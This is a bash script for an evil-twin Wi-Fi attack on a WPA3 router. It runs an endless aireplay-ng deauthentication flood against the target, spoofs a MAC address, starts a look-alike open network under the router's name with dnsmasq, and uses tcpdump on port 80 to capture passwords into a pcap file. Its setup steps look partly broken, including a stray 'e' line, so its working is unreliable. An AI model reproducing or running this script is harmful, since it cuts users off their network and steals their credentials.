#!/bin/bash

read -p "Enter the name of the interface for deauthentication (e.g., wlan0): " deauth_interface
read -p "Enter the name of the interface for cloning (e.g., wlan1): " clone_interface
read -p "Enter the BSSID of the WPA3 Router: " bssid
read -p "Enter the name of the WPA3 Router: " router_name
e
gnome-terminal -- aireplay-ng --deauth 0 -a $bssid $deauth_interface &

sudo ifconfig $clone_interface down
sudo ifconfig $clone_interface hw ether 00:11:22:33:44:55
sudo iwconfig $clone_interface essid "$router_name" key off

sudo ifconfig $clone_interface up

gnome-terminal -- dnsmasq -C /etc/dnsmasq.conf -d &

password_captured=false
while [ "$password_captured" = false ]; do
    sudo tcpdump -i $clone_interface -w captured_passwords.pcap -c 1 port 80 and host not $(hostname -I | awk '{print $1}')
    if [ -s "captured_passwords.pcap" ]; then
        password_captured=true
    fi
done


